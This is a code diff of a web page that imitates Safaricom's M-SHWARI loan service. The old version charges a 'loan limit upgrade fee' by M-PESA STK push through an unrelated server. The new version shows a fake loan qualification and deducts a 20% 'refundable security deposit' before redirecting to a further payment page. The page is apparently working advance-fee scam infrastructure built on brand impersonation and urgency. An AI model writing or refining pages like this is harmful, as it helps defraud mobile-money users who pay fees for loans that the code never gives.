@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>M-SHWARI Loan Limit Payment</title>
+<title>Loan Processing Fee - M-SHWARI</title>
 
 <style>
 
@@ -17,85 +17,83 @@ font-family:Arial,sans-serif;
 
 body{
 background:#f3f3f3;
+padding:20px;
 }
 
 .header{
 background:#49B72F;
 color:white;
+padding:18px;
 text-align:center;
-padding:20px;
-font-size:20px;
+font-size:22px;
 font-weight:bold;
-}
-
-.container{
-max-width:500px;
-margin:20px auto;
-padding:15px;
+border-radius:12px;
+margin-bottom:15px;
 }
 
 .card{
 background:white;
-border-radius:15px;
 padding:20px;
+border-radius:15px;
+margin-bottom:15px;
 box-shadow:0 2px 10px rgba(0,0,0,.08);
 }
 
-.card h2{
+h2{
 color:#49B72F;
-text-align:center;
 margin-bottom:15px;
 }
 
 .info{
-background:#f8f8f8;
-border-left:4px solid #49B72F;
+background:#eef9ee;
 padding:12px;
-border-radius:10px;
-font-size:14px;
-color:#555;
-margin-bottom:15px;
-line-height:1.5;
+border-left:4px solid #49B72F;
+border-radius:8px;
+margin-bottom:12px;
+line-height:1.6;
 }
 
-.summary{
-background:#eef9ea;
-padding:15px;
-border-radius:10px;
-margin-bottom:15px;
-font-size:15px;
-color:#2d7c1f;
+.warning{
+background:#fff4e5;
+border-left:4px solid orange;
 }
 
-label{
+.loan-box{
+font-size:18px;
+line-height:2;
+}
+
+.loan-box span{
 font-weight:bold;
-display:block;
-margin-bottom:8px;
+color:#49B72F;
 }
 
-input{
-width:100%;
-padding:15px;
-border-radius:10px;
-border:1px solid #ddd;
-margin-bottom:15px;
-font-size:16px;
+.checkbox{
+margin-top:15px;
+display:flex;
+gap:10px;
+align-items:flex-start;
+}
+
+.checkbox input{
+margin-top:5px;
 }
 
 button{
 width:100%;
 padding:15px;
-background:#49B72F;
-color:white;
 border:none;
 border-radius:10px;
+background:#49B72F;
+color:white;
 font-size:18px;
 font-weight:bold;
 cursor:pointer;
+margin-top:20px;
 }
 
 button:disabled{
-opacity:0.7;
+opacity:.6;
 }
 
 .loader{
@@ -106,34 +104,32 @@ margin-top:15px;
 
 .loader span{
 display:inline-block;
-width:12px;
-height:12px;
+width:10px;
+height:10px;
 background:#49B72F;
 border-radius:50%;
 margin:0 3px;
-animation:bounce 1.4s infinite ease-in-out;
+animation:bounce 1.2s infinite;
 }
 
-.loader span:nth-child(2){animation-delay:.2s;}
-.loader span:nth-child(3){animation-delay:.4s;}
+.loader span:nth-child(2){
+animation-delay:.2s;
+}
+
+.loader span:nth-child(3){
+animation-delay:.4s;
+}
 
 @keyframes bounce{
-0%,80%,100%{transform:scale(0)}
-40%{transform:scale(1)}
+0%,80%,100%{
+transform:scale(0);
+}
+40%{
+transform:scale(1);
+}
 }
 
-.status{
-display:none;
-margin-top:15px;
-text-align:center;
-background:#eef9ea;
-padding:12px;
-border-radius:10px;
-color:#2d7c1f;
-font-weight:bold;
-}
-
-.success-modal{
+.modal{
 display:none;
 position:fixed;
 top:0;
@@ -146,252 +142,395 @@ align-items:center;
 z-index:9999;
 }
 
-.success-box{
-background:white;
-padding:25px;
-border-radius:20px;
-text-align:center;
+.modal-box{
 width:90%;
-max-width:350px;
+max-width:380px;
+background:white;
+border-radius:20px;
+padding:25px;
+text-align:center;
 }
 
-.check{
-width:70px;
-height:70px;
+.icon{
+width:80px;
+height:80px;
 background:#49B72F;
-color:white;
-font-size:40px;
 border-radius:50%;
 display:flex;
-align-items:center;
 justify-content:center;
+align-items:center;
 margin:auto;
+font-size:40px;
+color:white;
 margin-bottom:15px;
 }
 
-.success-box h2{
+.modal-box h3{
 color:#49B72F;
 margin-bottom:10px;
 }
 
-.success-box button{
-margin-top:15px;
-padding:12px;
-background:#49B72F;
-color:white;
-border:none;
-border-radius:10px;
-width:100%;
-font-size:16px;
+.modal-box p{
+line-height:1.6;
+margin-bottom:15px;
 }
 
 </style>
 </head>
-
 <body>
 
 <div class="header">
-Loan Limit Processing Payment
+M-SHWARI Loan Processing
 </div>
-
-<div class="container">
 
 <div class="card">
 
-<h2>Transaction Fee Payment</h2>
+<h2>Your Loan Qualification</h2>
+
+<div class="loan-box">
+
+Loan Qualified:
+<span id="qualifiedLoan">KES 0</span><br>
+
+Interest (5%):
+<span id="interest">KES 0</span><br>
+
+Total Repayment:
+<span id="repayment">KES 0</span><br>
+
+Refundable Security Deposit (20%):
+<span id="securityFee">KES 0</span>
+
+</div>
+
+</div>
+
+<div class="card">
 
 <div class="info">
-This payment is required to activate your M-SHWARI loan limit increase request.  
-Once payment is successful, your loan limit upgrade will be processed automatically.
+
+🎉 Congratulations!
+
+Based on your wallet balance and account activity, you qualify for a loan facility through M-SHWARI.
+
 </div>
 
-<div class="summary">
-Selected Amount: KSH <span id="amount"></span><br>
-Transaction Fee: KSH <span id="fee"></span>
+<div class="info">
+
+💡 Borrow today and grow your financial flexibility.
+
+The higher your wallet balance, the higher your future loan limit.
+
 </div>
 
-<label>M-PESA Phone Number</label>
-<input type="tel" id="phone" placeholder="07XXXXXXXX">
+<div class="info warning">
 
-<button id="payBtn" onclick="startPayment()">
-Pay Now
+🔒 A refundable security deposit equal to 20% of your approved loan will be deducted from your wallet.
+
+This deposit is automatically refunded after full loan repayment.
+
+</div>
+
+<div class="checkbox">
+
+<input type="checkbox" id="agree">
+
+<label for="agree">
+
+I agree to the Terms & Conditions and authorize M-SHWARI to deduct the refundable 20% security deposit from my wallet.
+
+</label>
+
+</div>
+
+<button id="continueBtn">
+Agree & Continue
 </button>
 
 <div class="loader" id="loader">
-<span></span><span></span><span></span>
-</div>
-
-<div class="status" id="status"></div>
-
+<span></span>
+<span></span>
+<span></span>
 </div>
 
 </div>
 
 <!-- SUCCESS MODAL -->
-<div class="success-modal" id="successModal">
-<div class="success-box">
 
-<div class="check">✓</div>
+<div class="modal" id="successModal">
 
-<h2>Payment Successful</h2>
+<div class="modal-box">
 
-<p id="successText"></p>
+<div class="icon">✓</div>
 
-<button onclick="goNextStep()">
-Continue
-</button>
+<h3>Processing Fee Approved</h3>
+
+<p>
+
+Your refundable security deposit has been reserved successfully.
+
+Proceeding to the next step...
+
+</p>
 
 </div>
+
 </div>
 
-<script>
+<script type="module">
 
-const SERVER =
-"https://withdrawal-optima.onrender.com";
+import { auth, db } from "./firebase.js";
 
-let amount =
-localStorage.getItem("boostAmount") || 0;
+import {
+doc,
+getDoc,
+updateDoc,
+setDoc
+}
+from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
 
-let fee =
-localStorage.getItem("transactionCost") || 0;
+let qualifiedLoan = 0;
+let securityFee = 0;
+let totalRepayment = 0;
 
-document.getElementById("amount").innerText = amount;
-document.getElementById("fee").innerText = fee;
+async function loadLoanData(){
 
-async function startPayment(){
+const user = auth.currentUser;
 
-const phone =
-document.getElementById("phone").value.trim();
+if(!user){
+location.href = "login.html";
+return;
+}
 
-if(!phone){
-alert("Enter phone number");
+const userRef =
+doc(db,"users",user.uid);
+
+const snap =
+await getDoc(userRef);
+
+if(!snap.exists()){
+alert("Account not found");
+return;
+}
+
+const data = snap.data();
+
+const wallet =
+Number(data.wallet || 0);
+
+qualifiedLoan =
+Math.min(wallet * 5,100000);
+
+if(qualifiedLoan < 5000){
+
+alert(
+"Your wallet balance is too low to qualify for a loan."
+);
+
+location.href = "deposit.html";
+
+return;
+}
+
+const interest =
+qualifiedLoan * 0.05;
+
+totalRepayment =
+qualifiedLoan + interest;
+
+securityFee =
+qualifiedLoan * 0.20;
+
+document.getElementById(
+"qualifiedLoan"
+).innerText =
+"KES " +
+qualifiedLoan.toLocaleString();
+
+document.getElementById(
+"interest"
+).innerText =
+"KES " +
+interest.toLocaleString();
+
+document.getElementById(
+"repayment"
+).innerText =
+"KES " +
+totalRepayment.toLocaleString();
+
+document.getElementById(
+"securityFee"
+).innerText =
+"KES " +
+securityFee.toLocaleString();
+
+}
+
+auth.onAuthStateChanged(user=>{
+
+if(user){
+
+loadLoanData();
+
+}else{
+
+location.href="login.html";
+
+}
+
+});
+
+document.getElementById(
+"continueBtn"
+).addEventListener(
+"click",
+async()=>{
+
+const agree =
+document.getElementById("agree");
+
+if(!agree.checked){
+
+alert(
+"Please accept the Terms & Conditions."
+);
+
 return;
 }
 
 const btn =
-document.getElementById("payBtn");
+document.getElementById(
+"continueBtn"
+);
 
 const loader =
-document.getElementById("loader");
-
-const status =
-document.getElementById("status");
+document.getElementById(
+"loader"
+);
 
 btn.disabled = true;
-btn.innerText = "Sending STK Push...";
 loader.style.display = "block";
 
 try{
 
-const response =
-await fetch(
-SERVER + "/stk-push",
-{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-phone,
-amount:fee,
-purpose:"Loan Limit Upgrade Fee"
-})
-}
-);
+const user =
+auth.currentUser;
+
+const userRef =
+doc(db,"users",user.uid);
+
+const snap =
+await getDoc(userRef);
 
 const data =
-await response.json();
+snap.data();
 
-const checkoutId =
-data.checkout_request_id ||
-data.CheckoutRequestID;
+const wallet =
+Number(data.wallet || 0);
 
-if(!checkoutId){
-throw new Error("Failed to initiate payment");
-}
+if(wallet < securityFee){
 
-status.style.display = "block";
-status.innerText =
-"STK Push sent. Enter M-PESA PIN.";
+alert(
+"Insufficient wallet balance for security deposit."
+);
 
-checkStatus(checkoutId);
-
-}catch(err){
-
-loader.style.display = "none";
 btn.disabled = false;
-btn.innerText = "Pay Now";
+loader.style.display = "none";
 
-alert(err.message);
-
+return;
 }
 
-}
-
-async function checkStatus(checkoutId){
-
-const interval =
-setInterval(async()=>{
-
-const response =
-await fetch(
-SERVER + "/check-status",
+await updateDoc(
+userRef,
 {
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-checkout_request_id:checkoutId
-})
+wallet:
+wallet - securityFee,
+
+securityDeposit:
+securityFee,
+
+qualifiedLoan:
+qualifiedLoan,
+
+loanRepayment:
+totalRepayment,
+
+loanStatus:
+"Pending"
 }
 );
 
-const data = await response.json();
+localStorage.setItem(
+"qualifiedLoan",
+qualifiedLoan
+);
 
-if(data.status === "completed"){
+localStorage.setItem(
+"securityFee",
+securityFee
+);
 
-clearInterval(interval);
+localStorage.setItem(
+"loanRepayment",
+totalRepayment
+);
 
-document.getElementById("loader").style.display = "none";
-document.getElementById("status").style.display = "none";
+const transactions =
+JSON.parse(
+localStorage.getItem(
+"transactions"
+)
+) || [];
 
-document.getElementById("successText").innerText =
-"Fee payment of KSH " + fee + " was successful. Your loan limit request is now being processed.";
+transactions.push({
 
-document.getElementById("successModal").style.display = "flex";
+type:
+"Loan Security Deposit",
+
+amount:
+securityFee,
+
+status:
+"Completed",
+
+date:
+new Date().toLocaleString()
+
+});
+
+localStorage.setItem(
+"transactions",
+JSON.stringify(
+transactions
+)
+);
+
+document.getElementById(
+"successModal"
+).style.display =
+"flex";
 
 setTimeout(()=>{
 
-window.location.href =
+location.href =
 "payment2.html";
 
-},3000);
+},2000);
+
+}catch(error){
+
+alert(error.message);
+
+btn.disabled = false;
+loader.style.display = "none";
 
 }
 
-if(data.status === "failed"){
-
-clearInterval(interval);
-
-alert("Payment failed");
-
-location.reload();
-
 }
-
-},5000);
-
-}
-
-function goNextStep(){
-
-window.location.href =
-"payment2.html";
-
-}
+);
 
 </script>
 
 </body>
-</html>
+  </html>
